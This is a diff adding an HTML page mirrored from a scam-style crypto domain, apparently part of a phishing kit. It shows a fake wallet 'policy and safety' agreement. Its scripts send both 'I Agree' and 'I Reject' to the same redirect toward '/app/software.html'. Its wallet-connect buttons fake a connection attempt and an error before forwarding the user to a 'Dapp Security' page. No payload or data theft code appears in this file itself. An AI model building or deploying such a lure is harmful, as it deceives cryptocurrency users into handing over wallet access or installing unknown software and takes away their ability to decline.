@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from vaultx-rpcrepairtofix.org/api/policy/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 01 Dec 2024 08:25:32 GMT -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Agreement Policy and Safety</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
+
+    <style>
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        body {
+            background-color: #000000;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+        }
+
+        .container {
+            background-color: #18181b;
+            border-radius: 12px;
+            padding: 2rem;
+            margin-top: 2rem;
+            max-width: 800px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        h1, h2 {
+            color: #5566ff;
+        }
+
+        .btn-primary {
+            background-color: #5566ff;
+            border-color: #5566ff;
+            transition: all 0.3s ease;
+        }
+
+        .btn-primary:hover {
+            background-color: #000000;
+            border-color: #ffffff;
+            transform: translateY(-2px);
+        }
+
+        .btn-secondary {
+            background-color: #3f3f46;
+            border-color: #3f3f46;
+            transition: all 0.3s ease;
+        }
+
+        .btn-secondary:hover {
+            background-color: #52525b;
+            border-color: #52525b;
+            transform: translateY(-2px);
+        }
+
+        .security-icon {
+            font-size: 3rem;
+            color: #5566ff;
+            animation: pulse 2s infinite;
+        }
+
+        section {
+            opacity: 0;
+            transform: translateY(20px);
+            animation: fadeIn 0.5s ease-out forwards;
+        }
+
+        section:nth-child(1) { animation-delay: 0.2s; }
+        section:nth-child(2) { animation-delay: 0.4s; }
+        section:nth-child(3) { animation-delay: 0.6s; }
+        section:nth-child(4) { animation-delay: 0.8s; }
+
+        .modal-content {
+            background-color: #18181b;
+            color: #ffffff;
+            border: 1px solid #5566ff;
+        }
+
+        .modal-header {
+            border-bottom: 1px solid #5566ff;
+        }
+
+        .modal-footer {
+            border-top: 1px solid #5566ff;
+        }
+
+        #countdownNumber {
+            font-size: 3rem;
+            font-weight: bold;
+            color: #5566ff;
+            animation: pulse 1s infinite;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 1.5rem;
+                margin-top: 1rem;
+            }
+
+            h1 {
+                font-size: 2rem;
+            }
+
+            h2 {
+                font-size: 1.5rem;
+            }
+
+            .btn-lg {
+                padding: 0.5rem 1rem;
+                font-size: 1rem;
+            }
+        }
+
+        @media (max-width: 576px) {
+            .container {
+                padding: 1rem;
+            }
+
+            h1 {
+                font-size: 1.75rem;
+            }
+
+            h2 {
+                font-size: 1.25rem;
+            }
+
+            .btn-group {
+                flex-direction: column;
+                width: 100%;
+            }
+
+            .btn-group .btn {
+                width: 100%;
+                margin-bottom: 0.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header class="text-center mb-5">
+            <h1 class="display-4">Agreement Policy and Safety</h1>
+            <p class="lead">Please review our policy and safety guidelines before proceeding.</p>
+        </header>
+
+        <section class="mb-5">
+            <h2>1. User Agreement</h2>
+            <p>By utilizing our cryptocurrency wallet services, you acknowledge and agree to comply with all relevant laws and regulations. You are solely responsible for safeguarding your account credentials, including your recovery phrase and private keys. It is essential to take all necessary precautions to maintain the confidentiality of your account information.</p>
+        </section>
+
+        <section class="mb-5">
+            <h2>2. Security Measures</h2>
+            <p>We adhere to industry-leading security protocols to ensure the safety of your assets. Below are the key security measures in place when using our platform:</p>
+            <ul>
+                 <li>It is strongly recommended that you use a unique and robust password for your account.</li>
+                <li>Enable two-factor authentication (2FA) to enhance the security of your account.</li>
+             </ul>
+        </section>
+
+        <section class="mb-5">
+            <h2>3. Risk Disclosure</h2>
+            <p>Cryptocurrency investments are inherently risky. Due to the volatility of digital assets, their value can fluctuate significantly. It is crucial to only invest funds that you can afford to lose. Please be aware that we are not responsible for any losses resulting from market volatility or user error.</p>
+        </section>
+
+        <section class="mb-5">
+            <h2>4. Privacy Policy</h2>
+            <p>We are committed to protecting your privacy. Your personal information is handled in accordance with our Privacy Policy. By agreeing to these terms, you provide consent for the collection and use of your data as outlined in our Privacy Policy.</p>
+        </section>
+
+        <div class="text-center mb-4">
+            <div class="security-icon">🔒</div>
+            <p class="font-weight-bold">Your security is our top priority</p>
+        </div>
+
+        <div class="d-flex justify-content-center btn-group">
+            <button id="agreeBtn" class="btn btn-primary btn-lg me-3">I Agree</button>
+            <button id="rejectBtn" class="btn btn-secondary btn-lg">I Reject</button>
+        </div>
+    </div>
+
+    <!-- Add this modal to your HTML if it doesn't exist already -->
+<div id="loadingModal" class="modal">
+  <div class="modal-content">
+    <div class="loader"></div>
+    <p>Connecting to wallet...</p>
+  </div>
+</div>
+
+<style>
+  /* Add these styles to your CSS */
+  #loadingModal {
+    display: none;
+    position: fixed;
+    z-index: 1000;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.5);
+  }
+
+  #loadingModal .modal-content {
+    background-color: #fefefe;
+    margin: 15% auto;
+    padding: 20px;
+    border: 1px solid #888;
+    width: 300px;
+    text-align: center;
+    border-radius: 5px;
+  }
+
+  .loader {
+    border: 5px solid #f3f3f3;
+    border-top: 5px solid #3498db;
+    border-radius: 50%;
+    width: 50px;
+    height: 50px;
+    animation: spin 1s linear infinite;
+    margin: 0 auto 20px;
+  }
+
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+</style>
+
+<script>
+document.addEventListener('DOMContentLoaded', (event) => {
+    const REDIRECT_URL = "index.html"; // Replace with your desired URL
+    const modal = document.getElementById("walletModal");
+    const loadingModal = document.getElementById("loadingModal");
+    const serviceTitle = document.getElementById("serviceTitle");
+    const closeBtn = document.getElementsByClassName("close")[0];
+    const serviceItems = document.querySelectorAll('.service-item');
+    const loader = document.getElementById("loader");
+    const errorMessage = document.getElementById("errorMessage");
+    const actionButtons = document.getElementById("actionButtons");
+    const retryButton = document.getElementById("retryButton");
+    const manualConnectButton = document.getElementById("manualConnectButton");
+    const walletOptions = document.querySelectorAll('.wallet-option');
+
+    // New redirect modal elements
+    const redirectModal = new bootstrap.Modal(document.getElementById('redirectModal'));
+    const redirectProgress = document.getElementById('redirectProgress');
+
+    serviceItems.forEach(item => {
+        item.addEventListener('click', () => {
+            const service = item.getAttribute('data-service');
+            serviceTitle.textContent = service;
+            modal.style.display = "block";
+            resetModalState();
+        });
+    });
+
+    closeBtn.onclick = function() {
+        modal.style.display = "none";
+        resetModalState();
+    }
+
+    window.onclick = function(event) {
+        if (event.target == modal) {
+            modal.style.display = "none";
+            resetModalState();
+        }
+    }
+
+    function resetModalState() {
+        loader.style.display = "none";
+        errorMessage.style.display = "none";
+        actionButtons.style.display = "none";
+        document.querySelector('.wallet-options').style.display = "grid";
+    }
+
+    function showErrorState() {
+        loader.style.display = "none";
+        errorMessage.style.display = "block";
+        actionButtons.style.display = "flex";
+        document.querySelector('.wallet-options').style.display = "none";
+    }
+
+    function startCountdown() {
+        let progress = 0;
+        redirectModal.show();
+
+        const progressInterval = setInterval(() => {
+            progress += 2;
+            redirectProgress.style.width = `${progress}%`;
+            redirectProgress.setAttribute('aria-valuenow', progress);
+
+            if (progress >= 100) {
+                clearInterval(progressInterval);
+                redirectModal.hide();
+                window.location.href = REDIRECT_URL;
+            }
+        }, 50);
+    }
+
+    walletOptions.forEach(option => {
+        option.addEventListener('click', () => {
+            const walletName = option.querySelector('span').textContent;
+            loader.style.display = "block";
+            document.querySelector('.wallet-options').style.display = "none";
+            
+            // Simulate API call delay
+            setTimeout(() => {
+                showErrorState();
+                // Start countdown and redirect
+                startCountdown();
+            }, 10000);
+        });
+    });
+
+    retryButton.addEventListener('click', () => {
+        resetModalState();
+        // Start countdown and redirect
+        startCountdown();
+    });
+
+    manualConnectButton.addEventListener('click', () => {
+        loadingModal.style.display = "block";
+        setTimeout(() => {
+            loadingModal.style.display = "none";
+            startCountdown();
+        }, 2000); // Show loading for 2 seconds before redirecting
+    });
+});
+</script>
+
+<!-- Redirect Modal -->
+<div class="modal fade" id="redirectModal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="redirectModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title" id="redirectModalLabel">Redirecting to Dapp Security</h5>
+            </div>
+            <div class="modal-body">
+                <div class="progress" style="height: 4px;">
+                    <div id="redirectProgress" class="progress-bar progress-bar-striped progress-bar-animated bg-primary" role="progressbar" style="width: 0%;" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+  <!-- Include Bootstrap Bundle -->
+  <script src="css/jquery-3.3.1.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
+
+<script>
+    function startCountdown(action) {
+        const redirectModal = new bootstrap.Modal(document.getElementById('redirectModal'));
+        const redirectProgress = document.getElementById('redirectProgress');
+        let progress = 0;
+
+        redirectModal.show();
+
+        const progressInterval = setInterval(() => {
+            progress += 2;
+            redirectProgress.style.width = `${progress}%`;
+            redirectProgress.setAttribute('aria-valuenow', progress);
+
+            if (progress >= 100) {
+                clearInterval(progressInterval);
+                redirectModal.hide();
+                window.location.href = '/app/software.html';
+            }
+        }, 50);
+    }
+
+    document.getElementById('agreeBtn').addEventListener('click', () => startCountdown('agree'));
+    document.getElementById('rejectBtn').addEventListener('click', () => startCountdown('reject'));
+</script>
+</body>
+
+<!-- Mirrored from vaultx-rpcrepairtofix.org/api/policy/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 01 Dec 2024 08:25:34 GMT -->
+</html>
